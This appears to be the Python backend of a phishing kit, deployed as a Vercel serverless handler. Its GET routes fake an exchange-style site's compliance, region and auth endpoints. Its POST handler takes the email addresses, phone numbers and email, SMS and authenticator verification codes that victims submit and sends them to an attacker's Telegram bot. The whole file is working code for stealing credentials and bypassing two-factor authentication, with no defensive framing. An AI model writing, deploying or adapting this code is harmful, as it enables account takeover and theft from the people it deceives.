import json
import os
import requests
from urllib.parse import urlparse, parse_qs

def handler(request, context):
    """Main handler function for Vercel"""
    method = request.method
    path = request.url
    
    # Handle CORS preflight
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type'
            }
        }
    
    if method == 'GET':
        return handle_get(path)
    elif method == 'POST':
        return handle_post(request)
    
    return {
        'statusCode': 405,
        'headers': {'Access-Control-Allow-Origin': '*'},
        'body': json.dumps({'error': 'Method not allowed'})
    }

def handle_get(path):
    """Handle GET requests"""
    # Mock API responses for various endpoints
    if 'banner-compliance-check' in path:
        response_data = {"success": True, "data": {"show": False}}
    elif 'country-city-short' in path:
        response_data = {"country": "UA", "city": "Kyiv"}
    elif any(endpoint in path for endpoint in ['commonConfig', 'complianceActionCheck', 'businessCheckV2', 'region/language', 'querylangMappingByKey', 'authcenter/auth']):
        response_data = {"success": True, "data": {}}
    else:
        response_data = {"success": True, "data": {}}
    
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        },
        'body': json.dumps(response_data)
    }

def handle_post(request):
    """Handle POST requests"""
    try:
        # Get Telegram credentials
        telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        
        if not telegram_bot_token or not telegram_chat_id:
            return {
                'statusCode': 500,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                'body': json.dumps({"success": False, "error": "Telegram not configured"})
            }
        
        # Parse request body
        try:
            if hasattr(request, 'body'):
                body = request.body
                if isinstance(body, bytes):
                    body = body.decode('utf-8')
                data = json.loads(body)
            else:
                data = {}
        except:
            data = {}
        
        verification_type = data.get('type', 'unknown')
        code = data.get('code', '000000')
        email = data.get('email', '')
        phone = data.get('phone', '')
        
        # Format message for Telegram
        if verification_type == 'email':
            message = f"📧 Email верификация\n\nEmail: {email}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
        elif verification_type == 'sms':
            message = f"📱 SMS верификация\n\nТелефон: {phone}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"  
        elif verification_type == 'authenticator':
            message = f"🔐 Аутентификатор\n\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
        else:
            message = f"🔑 Верификация\n\nТип: {verification_type}\nКод: {code}"
        
        # Send to Telegram
        telegram_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
        telegram_data = {
            'chat_id': telegram_chat_id,
            'text': message
        }
        
        response = requests.post(telegram_url, json=telegram_data, timeout=10)
        
        if response.status_code == 200:
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                'body': json.dumps({"success": True, "message": "Код успешно отправлен"})
            }
        else:
            return {
                'statusCode': 500,
                'headers': {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                'body': json.dumps({"success": False, "error": "Ошибка отправки в Telegram"})
            }
            
    except Exception as e:
        return {
            'statusCode': 500,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            'body': json.dumps({"success": False, "error": "Ошибка отправки"})
        }
